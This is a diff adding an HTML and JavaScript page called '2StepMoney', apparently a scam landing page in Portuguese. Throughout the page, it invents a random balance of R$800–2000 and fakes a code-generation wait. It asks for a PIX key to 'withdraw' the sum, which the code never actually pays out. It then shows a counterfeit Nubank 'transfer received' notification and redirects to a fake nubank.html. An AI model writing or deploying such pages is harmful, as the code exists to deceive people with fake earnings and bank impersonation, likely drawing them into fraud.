@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html data-bs-theme="light" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>2StepMoney</title>
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato&amp;display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,500,600,700,900&amp;display=swap">
+    <link rel="stylesheet" href="assets/fonts/font-awesome.min.css">
+    <link rel="stylesheet" href="assets/css/animate.min.css">
+    <link rel="stylesheet" href="assets/css/styles.min.css">
+    <link rel="stylesheet" href="assets/css/styles.css">
+</head>
+
+<body style="font-family: Montserrat, sans-serif;background: rgb(0,0,0);">
+    <div style="text-align: center;margin-top: 12px;"><img class="img-fluid jello animated" src="assets/img/logo.webp" width="258" height="65"></div>
+    <div style="background: #ffd700;margin-right: 18px;margin-left: 18px;border-radius: 5px;padding: 0px;padding-top: 16px;padding-bottom: 16px;padding-right: 12px;padding-left: 12px;text-align: center;margin-top: 8px;">
+        <h1 style="font-size: 20.18px;margin-bottom: 0px;">Saldo Disponível:&nbsp;<span class="dinheirotopo" style="font-weight: bold;">R$ 0,00</span></h1>
+    </div>
+    <div class="text-center d-flex justify-content-center align-items-end fixed-bottom" id="fixadofundo" style="margin-bottom: 12px;"><i class="fa fa-power-off" style="color: #ffffff;font-size: 30px;margin-bottom: 10px;"></i>
+        <div class="botao-solicitar-saque" style="width: 80px;margin-right: 22px;margin-left: 22px;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--!Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2024 Fonticons, Inc.--><path fill="#ffd700" d="M242.4 292.5C247.8 287.1 257.1 287.1 262.5 292.5L339.5 369.5C353.7 383.7 372.6 391.5 392.6 391.5H407.7L310.6 488.6C280.3 518.1 231.1 518.1 200.8 488.6L103.3 391.2H112.6C132.6 391.2 151.5 383.4 165.7 369.2L242.4 292.5zM262.5 218.9C256.1 224.4 247.9 224.5 242.4 218.9L165.7 142.2C151.5 127.1 132.6 120.2 112.6 120.2H103.3L200.7 22.8C231.1-7.6 280.3-7.6 310.6 22.8L407.8 119.9H392.6C372.6 119.9 353.7 127.7 339.5 141.9L262.5 218.9zM112.6 142.7C126.4 142.7 139.1 148.3 149.7 158.1L226.4 234.8C233.6 241.1 243 245.6 252.5 245.6C261.9 245.6 271.3 241.1 278.5 234.8L355.5 157.8C365.3 148.1 378.8 142.5 392.6 142.5H430.3L488.6 200.8C518.9 231.1 518.9 280.3 488.6 310.6L430.3 368.9H392.6C378.8 368.9 365.3 363.3 355.5 353.5L278.5 276.5C264.6 262.6 240.3 262.6 226.4 276.6L149.7 353.2C139.1 363 126.4 368.6 112.6 368.6H80.8L22.8 310.6C-7.6 280.3-7.6 231.1 22.8 200.8L80.8 142.7H112.6z"/></svg></div><i class="fa fa-gear" style="color: #ffffff;font-size: 30px;margin-bottom: 10px;"></i>
+    </div>
+    <div id="centro" class="centro" style="text-align: center;"><a href="#" data-bs-target="#modal-1" data-bs-toggle="modal"><i class="fa fa-power-off" data-bss-hover-animate="flash" style="color: #ffd700;font-size: 154px;"></i>
+            <p style="color: #ffd700;margin-top: 14px;font-family: Montserrat, sans-serif;text-decoration:  underline;">DESLIGADO</p>
+        </a></div>
+    <div class="modal fade" role="dialog" tabindex="-1" id="modal-1">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="modal-header" style="background: #ffd700;border-style: none;border-color: rgb(39,44,50);">
+                    <h4 class="modal-title" style="font-weight: bold;">Aguardando o Código</h4><button class="btn-close" type="button" aria-label="Close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body text-center" style="background: #ffd700;"><span class="spinner-border" role="status" style="width: 100px;height: 100px;margin-top: 20px;"></span>
+                    <p style="margin-top: 14px;font-size: 14px;">Aguarde...</p>
+                </div>
+                <div class="modal-footer" style="background: #ffd700;border-color: rgb(33,38,42);border-top-color: rgb(33,;border-right-color: 37,;border-bottom-color: 41);border-left-color: 37,;"><button class="btn btn-light" type="button" data-bs-dismiss="modal" style="background: rgb(0,0,0);color: rgb(255,255,255);">Cancelar</button></div><script>
+    const modal = document.getElementById("modal-1");
+
+modal.addEventListener("shown.bs.modal", () => {
+  const valor = obterValor(document.querySelector('.dinheirotopo'));
+
+  setTimeout(() => {
+    const urlComParametro = `/codigogerado.html?dinheiro=${valor}`;
+    window.location.href = urlComParametro;
+  }, 7000);
+});
+
+// Função para obter o valor do elemento
+function obterValor(obj) {
+  return obj.textContent.replace('R$ ', '').replace(',', '.');
+}
+</script>
+            </div>
+        </div>
+    </div><script>
+// Função para gerar um valor aleatório entre 800 e 2000
+function gerarValorAleatorio() {
+  return Math.floor(Math.random() * (2000 - 800 + 1)) + 800;
+}
+
+// Função para animar o valor do elemento
+function animateValue(obj, start, end, duration) {
+  let startTimestamp = null;
+  const step = (timestamp) => {
+    if (!startTimestamp) startTimestamp = timestamp;
+    const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+    const valorAtual = start + progress * (end - start);
+    obj.innerHTML = `R$ ${valorAtual.toFixed(2).replace('.', ',')}`;
+    if (progress < 1) {
+      window.requestAnimationFrame(step);
+    }
+  };
+  window.requestAnimationFrame(step);
+
+  // Limita o número de caracteres durante a animação
+  const updateText = () => {
+    const valorAtual = obj.textContent.replace('R$ ', '');
+    if (valorAtual.length > 7) {
+      obj.textContent = `R$ ${valorAtual.substring(0, 7)}`;
+    }
+  };
+  setInterval(updateText, 100); // Atualiza o texto a cada 100ms
+}
+
+// Obtém o valor do parâmetro da URL
+const urlParams = new URLSearchParams(window.location.search);
+const valorParametro = urlParams.get('dinheiro');
+
+// Se o parâmetro existir, use o valor do parâmetro
+if (valorParametro) {
+  document.querySelector('.dinheirotopo').innerHTML = `R$ ${valorParametro.replace('.', ',')}`;
+} else {
+  // Gera um valor aleatório e o utiliza
+  const valorAleatorio = gerarValorAleatorio();
+  animateValue(document.querySelector('.dinheirotopo'), 0, valorAleatorio, 2000);
+}
+    
+    
+    
+    // Função para obter o valor do elemento
+function obterValor(obj) {
+  return obj.textContent.replace('R$ ', '').replace(',', '.');
+}
+
+// Função para atualizar a URL com o valor
+function atualizarURL(valor) {
+  const urlParams = new URLSearchParams(window.location.search);
+  urlParams.set('dinheiro', valor);
+  const novaURL = `${window.location.origin}${window.location.pathname}?${urlParams.toString()}`;
+  window.history.replaceState({}, '', novaURL);
+}
+
+// Gera um valor aleatório e o utiliza
+const valorAleatorio = gerarValorAleatorio();
+animateValue(document.querySelector('.dinheirotopo'), 0, valorAleatorio, 2000);
+
+// Atualiza a URL com o valor aleatório
+atualizarURL(valorAleatorio);
+
+// Adiciona um evento de clique a todos os links da página
+document.querySelectorAll('a').forEach((link) => {
+  link.addEventListener('click', () => {
+    const valor = obterValor(document.querySelector('.dinheirotopo'));
+    atualizarURL(valor);
+  });
+});
+
+
+</script>
+    <div id="aparecernoticacao">
+        <div id="notification-wrapper" class="notification-wrapper">
+            <div class="notification"><img src="assets/img/nubank.webp" class="notification-image">
+                <div class="notification-text"><span class="notification-title">Transferência recebida</span><span class="notification-description transferencia">Você recebeu uma transferência de R$770,20 de App Al-Hilal LTDA</span><script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Seleciona o elemento pelo ID 'saldo-aumentar'
+  var saldoAumentar = document.getElementById('saldo-aumentar');
+
+  // Seleciona o span onde o valor deve ser replicado
+  var spanTransferencia = document.querySelector('span.transferencia'); // Supondo que você adicione a classe 'transferencia' ao seu span
+
+  // Função para atualizar o span com o valor de 'saldo-aumentar'
+  function atualizarSpanTransferencia() {
+    // Pega o valor atual de 'saldo-aumentar'
+    var valorSaldoAumentar = saldoAumentar.textContent;
+
+    // Atualiza o span com o novo valor
+    spanTransferencia.textContent = 'Você recebeu uma transferência de ' + valorSaldoAumentar + ' de App Al-Hilal LTDA';
+  }
+
+  // Chama a função para atualizar o span assim que a página carrega
+  atualizarSpanTransferencia();
+
+  // Supondo que você queira atualizar o span toda vez que o saldo aumentar, você pode chamar 'atualizarSpanTransferencia'
+  // após a atualização do saldo ou em qualquer outro ponto em que o saldo seja modificado.
+});
+</script></div>
+            </div>
+        </div><script>
+  botaoSacar.addEventListener("click", function() {
+    setTimeout(function(){
+      notificationWrapper.style.display = "block";
+    }, 4000); 
+  });
+    
+</script>
+        <div class="modal-saque">
+            <div class="modal-conteudo">
+                <h2 class="h1solicitarsaque">SOLICITAR SAQUE</h2>
+                <form class="formdopix"><label class="form-label form-label" for="chave-pix">Digite sua chave PIX:</label>
+                    <div><input type="text" id="chave-pix" name="chave-pix"></div><button type="button" style="font-size:20px;border-radius:6px;background:#007474;border-style:none;font-weight:bold;padding-top:6px;padding-bottom:6px;padding-right:42px;padding-left:42px;margin-top:4px;color:rgb(255,255,255);" id="botao-sacar">SACAR</button>
+                    <p style="font-size:13px;margin-top:8px;font-style:italic;">Você só pode sacar o valor total</p>
+                </form><span class="close-button" style="border-radius:152px;"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewbox="0 0 24 24" fill="none" style="color:#007474;"><path d="M16.3394 9.32245C16.7434 8.94589 16.7657 8.31312 16.3891 7.90911C16.0126 7.50509 15.3798 7.48283 14.9758 7.85938L12.0497 10.5866L9.32245 7.66048C8.94589 7.25647 8.31312 7.23421 7.90911 7.61076C7.50509 7.98731 7.48283 8.62008 7.85938 9.0241L10.5866 11.9502L7.66048 14.6775C7.25647 15.054 7.23421 15.6868 7.61076 16.0908C7.98731 16.4948 8.62008 16.5171 9.0241 16.1405L11.9502 13.4133L14.6775 16.3394C15.054 16.7434 15.6868 16.7657 16.0908 16.3891C16.4948 16.0126 16.5171 15.3798 16.1405 14.9758L13.4133 12.0497L16.3394 9.32245Z" fill="currentColor"></path><path fill-rule="evenodd" d="M1 12C1 5.92487 5.92487 1 12 1C18.0751 1 23 5.92487 23 12C23 18.0751 18.0751 23 12 23C5.92487 23 1 18.0751 1 12ZM12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21Z" fill="currentColor"></path></svg></span>
+            </div><script>
+    // Função para fechar o modal
+function closeModal() {
+  document.querySelector('.modal-saque').style.display = 'none';
+}
+
+// Adiciona ouvinte de eventos ao botão de fechar
+document.querySelector('.close-button').addEventListener('click', closeModal);
+
+// Adiciona ouvinte de eventos ao fundo do modal (fora do form)
+document.addEventListener('click', function(event) {
+  var modal = document.querySelector('.modal-saque');
+
+  // Fecha o modal se clicar fora do form
+  if (!form.contains(event.target)) {
+    closeModal();
+  }
+});
+
+// Impede que eventos de clique no form fechem o modal
+document.querySelector('.formdopix').addEventListener('click', function(event) {
+  event.stopPropagation();
+});
+</script>
+        </div><script>
+const botaoSolicitarSaque = document.querySelector(".botao-solicitar-saque");
+const modalSaque = document.querySelector(".modal-saque");
+const botaoSacar = document.getElementById("botao-sacar");
+const notificationWrapper = document.querySelector(".notification-wrapper");
+
+botaoSolicitarSaque.addEventListener("click", (event) => {
+  event.preventDefault(); // evita redirecionar a página
+  modalSaque.style.display = "flex";
+});
+
+botaoSacar.addEventListener("click", (event) => {
+  event.preventDefault(); // evita redirecionar a página
+  const chavePix = document.getElementById("chave-pix").value;
+  console.log(`Solicitando saque com a chave PIX ${chavePix}`);
+  // aqui você pode fazer alguma ação, como enviar os dados para o servidor
+  modalSaque.style.display = "none";
+  
+  // Mostra a notificação após 4 segundos
+  setTimeout(function(){
+    notificationWrapper.style.display = "block";
+    
+    // Esconde a notificação após 8 segundos
+    setTimeout(function(){
+      notificationWrapper.style.display = "none";
+    }, 6000);
+  }, 4000);
+});
+    
+function mudarValor() {
+  setTimeout(function() {
+    document.getElementById("saldo-texto").innerHTML = "R$ 0,00";
+  }, 4000);
+}
+</script><script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Seleciona o botão pelo ID
+  var botaoSacar = document.getElementById('botao-sacar');
+
+  // Adiciona um ouvinte de eventos para o clique do botão
+  botaoSacar.addEventListener('click', function() {
+    // Aguarda 3 segundos (3000 milissegundos) antes de executar a função
+    setTimeout(function() {
+      // Seleciona o parágrafo pelo ID
+      var saldoAumentarParagrafo = document.getElementById('saldo-aumentar');
+      // Atualiza o texto do parágrafo
+      saldoAumentarParagrafo.textContent = 'R$0,00';
+    }, 3000); // 3 segundos de atraso
+  });
+});
+</script><style>
+    @keyframes slideOut {
+        from {
+            transform: translateX(0);
+        }
+        to {
+            transform: translateX(-100%);
+        }
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+        }
+        to {
+            opacity: 1;
+        }
+    }
+
+    body {
+        animation: fadeIn 1s ease-out;
+    }
+
+    #notification-wrapper {
+        cursor: pointer;
+    }
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var notificationWrapper = document.getElementById('notification-wrapper');
+    if (notificationWrapper) {
+        notificationWrapper.addEventListener('click', function() {
+            // Adiciona a animação ao body
+            document.body.style.animation = "slideOut 0.5s ease-out forwards";
+
+            // Espera a animação terminar para redirecionar
+            setTimeout(function() {
+                // Obtem o valor do parâmetro 'dinheiro' da URL atual
+                const params = new URLSearchParams(window.location.search);
+                const valorDinheiro = params.get('dinheiro'); // 'dinheiro' é o nome do parâmetro
+
+                // Verifica se o valor de 'dinheiro' existe antes de redirecionar
+                if(valorDinheiro !== null) {
+                    window.location.href = "nubank.html?dinheiro=" + valorDinheiro;
+                } else {
+                    // Caso o parâmetro 'dinheiro' não esteja presente na URL, redireciona sem o parâmetro
+                    // ou pode redirecionar para uma URL/página de erro, conforme preferir
+                    window.location.href = "nubank.html";
+                }
+            }, 500); // Ajuste este tempo de acordo com a duração da sua animação
+        });
+    }
+});
+</script>
+    </div>
+    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+    <script src="assets/js/bs-init.js"></script>
+</body>
+
+</html>
